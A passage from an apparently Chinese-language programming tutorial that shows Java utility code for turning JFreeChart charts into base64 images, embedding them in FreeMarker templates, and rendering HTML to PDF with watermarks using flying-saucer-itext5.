class="hljs-comment">     * base64字符串转换成图片</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> imgStr      base64字符串</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> imgFilePath 图片存放路径</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">base64ToImage</span><span class="hljs-params">(String imgStr, String imgFilePath)</span> &#123; <span class="hljs-comment">// 对字节数组字符串进行Base64解码并生成图片</span><br><br>        <span class="hljs-keyword">if</span> (StringUtils.isEmpty(imgStr)) &#123;<br>            <span class="hljs-comment">// 图像数据为空</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br><br>            <span class="hljs-type">byte</span>[] b = DatatypeConverter.parseBase64Binary(imgStr);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; b.length; ++i) &#123;<br>                <span class="hljs-keyword">if</span> (b[i] &lt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-comment">// 调整异常数据</span><br>                    b[i] += <span class="hljs-number">256</span>;<br>                &#125;<br>            &#125;<br><br>            out = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(imgFilePath);<br>            out.write(b);<br>            out.flush();<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (out != <span class="hljs-literal">null</span>) &#123;<br>                    out.close();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 数据集转base64图片链接</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> title 图标题</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> xAxisLabel x轴</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> yAxisLabel y轴</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> dataset 数据集</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> jpgName 图名称.jpg</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 图片的base64链接</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">genBase64ImageByChart</span><span class="hljs-params">(String title,</span><br><span class="hljs-params">                                               String xAxisLabel,</span><br><span class="hljs-params">                                               String yAxisLabel,</span><br><span class="hljs-params">                                               DefaultCategoryDataset dataset,</span><br><span class="hljs-params">                                               String jpgName)</span>&#123;<br>        <span class="hljs-comment">// 生成图表并保存图片至本地路径</span><br>        JfreeChartUtil.generateChartsAndExportJpg(title,xAxisLabel,yAxisLabel,dataset,jpgName);<br>        <span class="hljs-comment">// 获取图表jpg相对路径</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">imgRetPath</span> <span class="hljs-operator">=</span> JfreeChartUtil.IMG_PATH +<span class="hljs-string">&quot;/&quot;</span>+ jpgName;<br>        <span class="hljs-comment">// 获取图表jpg绝对路径</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">imgAbsPath</span> <span class="hljs-operator">=</span> Objects.requireNonNull(ImgBase64Util.class.getClassLoader().getResource(imgRetPath)).getPath();<br>        <span class="hljs-comment">// 将图片转为base64返回</span><br>        <span class="hljs-keyword">return</span> imageToBase64ByLocal(imgAbsPath);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="调用示例"><a href="#调用示例" class="headerlink" title="调用示例"></a>调用示例</h3><p>图表在<code>FTL</code> 模板中的示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;$&#123;recruitStudentImg&#125;&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;recruitStudentImg&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 90%;margin-left: 5%;margin-right: 15%&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在<code>java</code>中的调用示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;String, Object&gt; dataMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><span class="hljs-comment">// 创建数据</span><br><span class="hljs-type">DefaultCategoryDataset</span> <span class="hljs-variable">dataset</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultCategoryDataset</span>();<br>dataset.addValue(<span class="hljs-number">306</span>, <span class="hljs-string">&quot;女&quot;</span>, <span class="hljs-string">&quot;高一&quot;</span>);<br>dataset.addValue(<span class="hljs-number">295</span>, <span class="hljs-string">&quot;女&quot;</span>, <span class="hljs-string">&quot;高二&quot;</span>);<br>dataset.addValue(<span class="hljs-number">285</span>, <span class="hljs-string">&quot;女&quot;</span>, <span class="hljs-string">&quot;高三&quot;</span>);<br>dataset.addValue(<span class="hljs-number">282</span>, <span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-string">&quot;高一&quot;</span>);<br>dataset.addValue(<span class="hljs-number">301</span>, <span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-string">&quot;高二&quot;</span>);<br>dataset.addValue(<span class="hljs-number">296</span>, <span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-string">&quot;高三&quot;</span>);<br><span class="hljs-comment">// 获取生成的图表</span><br><span class="hljs-type">String</span> <span class="hljs-variable">recruitStudentImg</span> <span class="hljs-operator">=</span> ImgBase64Util.genBase64ImageByChart(<span class="hljs-string">&quot;招生人数统计&quot;</span>, <span class="hljs-string">&quot;年份&quot;</span>, <span class="hljs-string">&quot;人数&quot;</span>, dataset, <span class="hljs-string">&quot;recruit_student.jpg&quot;</span>);<br>dataMap.put(<span class="hljs-string">&quot;recruitStudentImg&quot;</span>,recruitStudentImg);<br></code></pre></td></tr></table></figure><h1 id="三、使用-Flying-saucer-itext5-生成-PDF"><a href="#三、使用-Flying-saucer-itext5-生成-PDF" class="headerlink" title="三、使用 Flying-saucer-itext5 生成 PDF"></a>三、使用 Flying-saucer-itext5 生成 PDF</h1><h2 id="3-1-什么是-Flying-saucer-itext5"><a href="#3-1-什么是-Flying-saucer-itext5" class="headerlink" title="3.1 什么是 Flying-saucer-itext5"></a>3.1 什么是 <code>Flying-saucer-itext5</code></h2><p> <code>iText</code>是著名的开放源码站点<code>sourceforge</code>的一个项目，是用于生成<code>PDF</code>文档的一个<code>Java</code>类库。通过<code>iText</code>不仅可以生成<code>PDF</code>或<code>RTF</code>的文档，而且可以将<code>XML</code>、<code>HTML</code>文件转化为<code>PDF</code>文件。  <code>flying sauser</code> 基于<code>iText</code>并做了封装，能进一步解析<code>HTML</code>和<code>CSS</code>。 </p><h2 id="3-2-依赖引入"><a href="#3-2-依赖引入" class="headerlink" title="3.2 依赖引入"></a>3.2 依赖引入</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- html转PDF --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.xhtmlrenderer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>flying-saucer-pdf-itext5<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.1.22<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="3-3-HTML转PDF"><a href="#3-3-HTML转PDF" class="headerlink" title="3.3 HTML转PDF"></a>3.3 HTML转PDF</h2><p>这里使用到工具类 <code>HtmlToPDFUtil</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * HtmlToPdfUtil 转换pdf工具类</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> DunkingCurry</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HtmlToPDFUtil</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 使用 freemarker 渲染 HTML</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> templateFileName HTML模板路径</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> data   渲染的参数</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 返回渲染后的html代码</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">render</span><span class="hljs-params">(String templateFileName, Object data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Configuration</span> <span class="hljs-variable">cfg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>(Configuration.DEFAULT_INCOMPATIBLE_IMPROVEMENTS);<br>        <span class="hljs-comment">// 指定FreeMarker模板文件的位置</span><br>        cfg.setClassForTemplateLoading(PdfTemplateUtil.class,<span class="hljs-string">&quot;/template&quot;</span>);<br>        <span class="hljs-type">Template</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> cfg.getTemplate(templateFileName, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br><br>        <span class="hljs-comment">// 将数据输出到html中</span><br>        template.process(data, writer);<br>        writer.flush();<br>        <span class="hljs-keyword">return</span> writer.toString();<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 根据html生成pdf的base64格式</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getPDFBase64ByHtml</span><span class="hljs-params">(String html)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//构建字节输出流</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ITextRenderer</span> <span class="hljs-variable">renderer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ITextRenderer</span>();<br>        <span class="hljs-comment">// 解决base64图片支持问题</span><br>        <span class="hljs-type">SharedContext</span> <span class="hljs-variable">sharedContext</span> <span class="hljs-operator">=</span> renderer.getSharedContext();<br>        sharedContext.setReplacedElementFactory(<span class="hljs-keyword">new</span> <span class="hljs-title class_">B64ImgReplacedElementFactory</span>());<br>        sharedContext.getTextRenderer().setSmoothingThreshold(<span class="hljs-number">0</span>);<br>        <span class="hljs-type">ITextFontResolver</span> <span class="hljs-variable">fontResolver</span> <span class="hljs-operator">=</span> renderer.getFontResolver();<br>        <span class="hljs-comment">// html中设置的字体样式需要参考此处debug后fontResolver的fontFamily的数据的key</span><br>        <span class="hljs-comment">//指定文件字体添加到PDF库，指定字体不作为内部字体，而是外部字体被加载</span><br>        fontResolver.addFont(<span class="hljs-string">&quot;/template/font/simsun.ttc,0&quot;</span>, BaseFont.IDENTITY_H, BaseFont.NOT_EMBEDDED);<br>        renderer.setDocumentFromString(html);<br>        renderer.layout();<br>        renderer.createPDF(baos);<br><br>        <span class="hljs-keyword">return</span> Base64.encodeBytes(baos.toByteArray());<br>    &#125;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 根据pdf的base64格式和路径生成pdf文件</span><br><span class="hljs-comment">     *  <span class="hljs-doctag">@param</span> base64 pdf的base64格式</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ByteArrayOutputStream <span class="hljs-title function_">base64ToPDF</span><span class="hljs-params">(String base64)</span> &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Base64.decode(base64);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            out.write(bytes);<br>            out.flush();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> out;<br>    &#125;<br><br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 合并添加水印 页眉和页脚 水印的方法 (可根据需求自行改动封装)</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> pdfBase64        PDF的Base64格式</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> isAddWatermark   是否添加水印</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> waterMarkName    水印文字</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> isAddPageNumbers 是否添加页眉</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> headerText       页眉名称</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> isAddLogoImg     是否添加Logo</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> logoPath         logo图片路径</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> newWidth         图片大小宽度如 141</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> newHeight        图片大小高度如30</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> absoluteX        图片相对位置 如20</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> absoluteY        图片相对位置 如-30</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">pdfAddWaterHeaderLogo</span><span class="hljs-params">(String pdfBase64</span><br><span class="hljs-params">            , <span class="hljs-type">boolean</span> isAddWatermark, String waterMarkName</span><br><span class="hljs-params">            , <span class="hljs-type">boolean</span> isAddPageNumbers, String headerText</span><br><span class="hljs-params">            , <span class="hljs-type">boolean</span> isAddLogoImg, String logoPath, <span class="hljs-type">float</span> newWidth, <span class="hljs-type">float</span> newHeight, <span class="hljs-type">float</span> absoluteX, <span class="hljs-type">float</span> absoluteY</span><br><span class="hljs-params">            , <span class="hljs-type">boolean</span> isAddWatermarkLogo, String watermarkLogoPath</span><br><span class="hljs-params">            , <span class="hljs-type">boolean</span> isAddBgImage, String bgImagePath</span><br><span class="hljs-params">    )</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">byte</span>[] bytes = Base64.decode(pdfBase64);<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * PdfReader是iText库中的PDF解析器，用于读取和解析PDF文件。通过PdfReader对象，可以获取PDF文件的各种属性和内容，</span><br><span class="hljs-comment">             * 如总页数、页面尺寸、文本内容等。它提供了方法来打开和关闭PDF文件，并可以从文件路径、InputStream或字节数组等多种方式加载PDF文件。</span><br><span class="hljs-comment">             *</span><br><span class="hljs-comment">             * PdfStamper是iText库中的PDF编辑器，用于修改和编辑PDF文件。通过PdfStamper对象，</span><br><span class="hljs-comment">             * 可以在PDF文件中添加文本、图片、表单域等元素，修改页面内容、添加注释、加密文档等操作。它基于已解析的PdfReader对象，可以将修改后的内容写入新的PDF文件或覆盖原始文件。</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-type">PdfReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PdfReader</span>(bytes);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">PdfStamper</span> <span class="hljs-variable">stamper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PdfStamper</span>(reader, bos);<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> reader.getNumberOfPages();<br><br>            <span class="hljs-keyword">if</span> (isAddBgImage) &#123;<br>                addBackgroundImage(stamper, reader, bgImagePath);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (isAddLogoImg) &#123;<br>                addLogoImg(stamper, reader, logoPath, newWidth, newHeight, absoluteX, absoluteY);<br>            &#125;<br><br><br>            <span class="hljs-keyword">if</span> (isAddPageNumbers) &#123;<br>                addPageNumbers(stamper, reader, headerText);<br>            &#125;<br><br>            <span class="hljs-comment">// 添加水印放到最后执行 否则会将页眉页脚进行透明度设置</span><br>            <span class="hljs-keyword">if</span> (isAddWatermark) &#123;<br>                addWatermark(stamper, reader, waterMarkName);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (isAddWatermarkLogo) &#123;<br>                addWatermarkImage(stamper, reader, watermarkLogoPath);<br>            &#125;<br><br><br>            stamper.close();<br>            reader.close();<br>            <span class="hljs-keyword">return</span> Base64.encodeBytes(bos.toByteArray());<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | DocumentException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 添加水印</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> stamper       PdfStamper对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> reader        PdfReader对象</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> waterMarkName 水印文字</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addWatermark</span><span class="hljs-params">(PdfStamper stamper, PdfReader reader, String waterMarkName)</span> <span class="hljs-keyword">throws</span> DocumentException, IOException &#123;<br>        <span class="hljs-type">BaseFont</span> <span class="hljs-variable">baseFont</span> <span class="hljs-operator">=</span> BaseFont.createFont(<span class="hljs-string">&quot;/template/font/simsun.ttc,0&quot;</span>, BaseFont.IDENTITY_H, BaseFont.NOT_EMBEDDED);<br>        Rectangle pageRect;<br>        <span class="hljs-type">PdfGState</span> <span class="hljs-variable">gs</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PdfGState</span>();<br>        <span class="hljs-comment">// 填充的透明度</span><br>        gs.setFillOpacity(<span class="hljs-number">0.1f</span>);<br>        <span class="hljs-comment">// 描边的透明度</span><br>        gs.setStrokeOpacity(<span class="hljs-number">0.1f</span>);<br><br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">label</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>();<br>        FontMetrics metrics;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">textH</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">textW</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        label.setText(waterMarkName);<br>        metrics = label.getFontMetrics(label.getFont());<br>        textH = metrics.getHeight();<br>        textW = metrics.stringWidth(label.getText());<br><br>        PdfContentByte under;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= reader.getNumberOfPages(); i++) &#123;<br>            pageRect = reader.getPageSizeWithRotation(i);<br>            under = stamper.getOverContent(i);<br>            under.saveState();<br>            under.setGState(gs);<br>            under.beginText();<br>            under.setFontAndSize(baseFont, <span class="hljs-number">20</span>);<br>            <span class="hljs-comment">//水印颜色</span><br>            under.setColorFill(BaseColor.BLACK);<br><br>            <span class="hljs-comment">// 水印文字成30度角倾斜</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">height</span> <span class="hljs-operator">=</span> -<span class="hljs-number">5</span> + textH; height &lt; pageRect.getHeight(); height = height + textH * <span class="hljs-number">4</span>) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">width</span> <span class="hljs-operator">=</span> -<span class="hljs-number">5</span> + textW; width &lt; pageRect.getWidth() + textW; width = width + textW * <span class="hljs-number">3</span>) &#123;<br>                    under.showTextAligned(Element.ALIGN_LEFT, waterMarkName, width - textW, height - textH, <span class="hljs-number">30</span>);<br>                &#125;<br>            &#125;<br>            <span class="hljs-comment">// 添加水印文字</span><br>            under.endText();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 添加页眉 (页脚)</span><br><span class="hljs-comment">     *</span><br><span 